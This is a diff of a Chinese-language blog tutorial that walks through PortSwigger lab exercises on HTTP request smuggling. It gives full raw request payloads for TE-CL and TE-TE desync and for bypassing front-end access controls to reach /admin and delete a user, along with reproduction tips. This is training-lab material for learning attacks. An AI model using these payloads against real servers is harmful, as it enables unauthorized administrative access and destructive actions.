@@ -434,7 +434,7 @@ Transfer-Encoding: chunked
 G → 1</code></pre>
 <p>发送两次请求即可实现预期响应，原理与<code>CL-CL</code>相同</p>
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2016.png" alt="screenshot 16"></p>
-<p>‼️<strong>如果要对<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">靶机</a>进行一次成功的HTTP Smuggling攻击，还需要对请求包以及Burp Suite进行修改</strong></p>
+<p>‼️<strong>如果要对<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">靶机</a>进行此次HTTP Smuggling攻击，还需要对请求包以及Burp Suite进行修改</strong></p>
 <ol>
 <li><p>取消自动更新<code>Content-Length</code></p>
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2017.png" alt="screenshot 17"></p>
@@ -456,11 +456,103 @@ Content-Type: application/x-www-form-urlencoded
 Content-length: 4
 Transfer-Encoding: chunked
 \r\n
-12\r\n
-GPOST / HTTP/1.1\r\n
-\r\n
+5c\r\n
+GPOST / HTTP/1.1\r\n → 18
+Content-Type: application/x-www-form-urlencoded\r\n → 47
+Content-Length: 15\r\n → 20
+\r\n → 2
+x=1\r\n → 5
 0\r\n
 \r\n</code></pre>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2014.png" alt="screenshot 14"></p>
+<p>前端服务器处理<code>Transfer-Encoding</code>，当其读取到<code>0\r\n\r\n</code>时，认为读取完毕，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，当它读取完<code>5c\r\n</code>之后，就认为请求已经结束，后面的数据来自另一个请求</p>
+<h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>当收到存在两个<code>Transfer-Encoding</code>头字段的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，这确实实现了<code>RFC</code>标准。但如果取第二个<code>TE</code>字段作为解析标准，而第二个字段值非正常或者解析出错，就可能会忽略<code>TE</code>字段，而使用<code>CL</code>字段进行解析。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>的实现</p>
+<pre><code>POST / HTTP/1.1
+Host: ac261fa81fc4c34a80af8277000800cc.web-security-academy.net
+Connection: close
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=RxKnW4kwfzaLVN8L9axZCS8JQR78u8Az
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+\r\n
+5c\r\n
+GPOST / HTTP/1.1\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 15\r\n
+\r\n
+x=1\r\n
+0\r\n
+\r\n</code></pre>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2018.png" alt="screenshot 18"></p>
+<p><strong>❗️复现靶机时注意</strong></p>
+<pre><code>0\r\n
+\r\n 👈 此时已经结束了 在回车换行就会导致走私失败</code></pre>
+<h1 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h1><p><code>PortSwigger</code>中提供了利用HTTP请求走私攻击的<a href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">实验</a></p>
+<h2 id="绕过前端服务器的安全控制"><a href="#绕过前端服务器的安全控制" class="headerlink" title="绕过前端服务器的安全控制"></a>绕过前端服务器的安全控制</h2><p>在网络环境中，前端服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，<strong>而后端服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应</strong>。因此可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应</p>
+<p><strong>👇两个实验分别使用<code>CL-TE</code>和<code>TE-CL</code>绕过前端的访问控制</strong></p>
+<h4 id="使用CL-TE绕过前端服务器安全控制"><a href="#使用CL-TE绕过前端服务器安全控制" class="headerlink" title="使用CL-TE绕过前端服务器安全控制"></a>使用<code>CL-TE</code>绕过前端服务器安全控制</h4><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">实验</a>目的是获取admin权限并删除用户carlos</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2019.png" alt="screenshot 19"></p>
+<p>直接访问<code>/admin</code>当数据包流经前端服务器是会被拦截</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2020.png" alt="screenshot 20"></p>
+<pre><code>POST / HTTP/1.1
+Host: ac281fa51e171f3e80234adf00da00a7.web-security-academy.net
+Connection: close
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=lkZNiqMVzpGe4hIBlo68tFsISNjEO7j7
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+Transfer-Encoding: chunked
+\r\n
+0\r\n
+\r\n
+GET /admin HTTP/1.1\r\n 👈 别忘了CRLF
+\r\n 👈 有时候可能还需要一个CRLF</code></pre>
+<p><strong>❗️走私请求如果一次不成功多试几次，存在一定概率(不小)会发生走私失败</strong></p>
+<p><strong>👇此时开启Burp Suite的Upgrade Content-Length选项方便构造</strong></p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2021.png" alt="screenshot 21"></p>
+<p>👆提示只有以管理员身份访问或者在本地登录才可以访问<code>/admin</code>接口</p>
+<p>在走私的请求中，添加一个<code>Host: localhost</code>请求头，然后重新进行请求</p>
+<pre><code>POST / HTTP/1.1
+Host: ac281fa51e171f3e80234adf00da00a7.web-security-academy.net
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=lkZNiqMVzpGe4hIBlo68tFsISNjEO7j7
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Transfer-Encoding: chunked
+\r\n
+0\r\n
+\r\n
+GET /admin HTTP/1.1\r\n
+Host: localhost\r\n</code></pre>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2022.png" alt="screenshot 22"></p>
+<p>👆成功访问admin界面，之后设置<code>/admin/delete?username=calos</code>删除carlos即可</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2023.png" alt="screenshot 23"></p>
+<h3 id="使用TE-CL绕过前端服务器安全控制"><a href="#使用TE-CL绕过前端服务器安全控制" class="headerlink" title="使用TE-CL绕过前端服务器安全控制"></a>使用<code>TE-CL</code>绕过前端服务器安全控制</h3><p>👇将请求体转换转换为<code>chunked</code>格式</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2025.png" alt="screenshot 25"></p>
+<p><strong>❗️修改<code>Content-Length: 4</code>之后反复请求直到走私成功(千万不要忘了)</strong></p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2024.png" alt="screenshot 24"></p>
+<p>执行<code>/admin/delete?username=carlos</code>时虽然无法从结果中判断是否成功，但可以通过再次访问<code>/admin</code>得知成功与否</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2026.png" alt="screenshot 26"></p>
 <h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p>
 <p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p>
 <p><strong>郑重感谢</strong></p>
